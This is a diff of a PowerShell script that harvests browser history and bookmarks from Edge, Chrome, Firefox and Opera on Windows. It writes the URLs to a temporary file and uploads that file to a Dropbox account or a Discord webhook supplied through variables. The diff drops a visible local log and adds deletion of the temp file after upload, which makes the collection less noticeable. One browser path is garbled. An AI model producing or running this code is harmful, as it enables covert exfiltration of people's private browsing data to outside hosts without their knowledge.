@@ -1,72 +1,126 @@
 function Get-BrowserData {
-
     [CmdletBinding()]
     param (	
-        [Parameter(Position=1, Mandatory=$True)]
-        [string]$Browser,    
-        [Parameter(Position=2, Mandatory=$True)]
-        [string]$DataType 
+        [Parameter(Position=1, Mandatory = $true)]
+        [string]$Browser,
+        [Parameter(Position=2, Mandatory = $true)]
+        [string]$DataType
     ) 
 
     $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
 
-    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
-    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
-    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
-    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE\AppData\Local\Microsof/Edge/User Data/Default/Bookmarks"}
-    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
-    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
-    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}
+    switch -Regex ($Browser) {
+        'chrome' {
+            switch ($DataType) {
+                'history'   { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
+                'bookmarks' { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" }
+            }
+            break
+        }
+        'edge' {
+            switch ($DataType) {
+                'history'   { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History" }
+                'bookmarks' { $Path = "$env:USERPROFILE\AppData\Local\MicrosofEdge/User Data/Default/Bookmarks" }
+            }
+            break
+        }
+        'firefox' {
+            if ($DataType -eq 'history') {
+                $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
+            }
+            break
+        }
+        'opera' {
+            switch ($DataType) {
+                'history'   { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History" }
+                'bookmarks' { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks" }
+            }
+            break
+        }
+        default {
+            Write-Warning "Unsupported browser: $Browser"
+            return
+        }
+    }
 
-    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+    $Value = Get-Content -Path $Path | Select-String -AllMatches $Regex | ForEach-Object { $_.Matches.Value } | Sort -Unique
     $Value | ForEach-Object {
         $Key = $_
-        if ($Key -match $Search){
-            New-Object -TypeName PSObject -Property @{
-                User = $env:UserName
-                Browser = $Browser
+        if ($Key -match $Search) {
+            [PSCustomObject]@{
+                User     = $env:UserName
+                Browser  = $Browser
                 DataType = $DataType
-                Data = $_
+                Data     = $_
             }
         }
     } 
 }
 
-$LogFilePath = "$env:USERPROFILE\Desktop\BrowserData_Log.txt"
+$OutputFile = "$env:TMP\--BrowserData.txt"
 
-"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Starting data collection." | Out-File -FilePath $LogFilePath -Append
+Get-BrowserData -Browser "edge" -DataType "history" >> $OutputFile
+Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $OutputFile
+Get-BrowserData -Browser "chrome" -DataType "history" >> $OutputFile
+Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $OutputFile
+Get-BrowserData -Browser "firefox" -DataType "history" >> $OutputFile
+Get-BrowserData -Browser "opera" -DataType "history" >> $OutputFile
+Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $OutputFile
 
-Get-BrowserData -Browser "edge" -DataType "history" >> $env:TEMP\--BrowserData.txt
-"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Data for Edge history collected." | Out-File -FilePath $LogFilePath -Append
+# Upload output file to Dropbox
+function Upload-Dropbox {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
+        [Alias("f")]
+        [string]$SourceFilePath
+    ) 
 
-Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TEMP\--BrowserData.txt
-"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Data for Edge bookmarks collected." | Out-File -FilePath $LogFilePath -Append
+    $OutputFile = Split-Path $SourceFilePath -Leaf
+    $TargetFilePath = "/$OutputFile"
+    $Arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+    $Authorization = "Bearer $db"
+    $Headers = @{
+        "Authorization"   = $Authorization
+        "Dropbox-API-Arg" = $Arg
+        "Content-Type"    = 'application/octet-stream'
+    }
 
-Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TEMP\--BrowserData.txt
-"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Data for Chrome history collected." | Out-File -FilePath $LogFilePath -Append
-
-Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TEMP\--BrowserData.txt
-"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Data for Chrome bookmarks collected." | Out-File -FilePath $LogFilePath -Append
-
-Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TEMP\--BrowserData.txt
-"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Data for Firefox history collected." | Out-File -FilePath $LogFilePath -Append
-
-Get-BrowserData -Browser "opera" -DataType "history" >> $env:TEMP\--BrowserData.txt
-"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Data for Opera history collected." | Out-File -FilePath $LogFilePath -Append
-
-Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TEMP\--BrowserData.txt
-"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Data for Opera bookmarks collected." | Out-File -FilePath $LogFilePath -Append
-
-# Upload output file to Dropbox (if $db variable is not empty)
-if (-not ([string]::IsNullOrEmpty($db))) {
-    "Uploading data to Dropbox." | Out-File -FilePath $LogFilePath -Append
-    DropBox-Upload -SourceFilePath "$env:TEMP\--BrowserData.txt"
+    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $Headers
 }
 
-# Upload to Discord (if $dc variable is not empty)
-if (-not ([string]::IsNullOrEmpty($dc))) {
-    "Uploading data to Discord." | Out-File -FilePath $LogFilePath -Append
-    Upload-Discord -file "$env:TEMP\--BrowserData.txt"
+if (-not [string]::IsNullOrEmpty($db)) {
+    Upload-Dropbox -SourceFilePath $OutputFile
 }
 
-"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Script execution completed." | Out-File -FilePath $LogFilePath -Append
+# Upload output file to Discord
+function Upload-Discord {
+    [CmdletBinding()]
+    param (
+        [Parameter(Position = 0, Mandatory = $false)]
+        [string]$File,
+        [Parameter(Position = 1, Mandatory = $false)]
+        [string]$Text 
+    )
+
+    $HookUrl = "$dc"
+    $Body = @{
+        'username' = $env:username
+        'content'  = $Text
+    }
+
+    if (-not [string]::IsNullOrEmpty($Text)) {
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $HookUrl -Method Post -Body ($Body | ConvertTo-Json)
+    }
+
+    if (-not [string]::IsNullOrEmpty($File)) {
+        curl.exe -F "file1=@$File" $HookUrl
+    }
+}
+
+if (-not [string]::IsNullOrEmpty($dc)) {
+    Upload-Discord -File $OutputFile
+}
+
+# Remove temporary file
+Remove-Item $OutputFile -Force
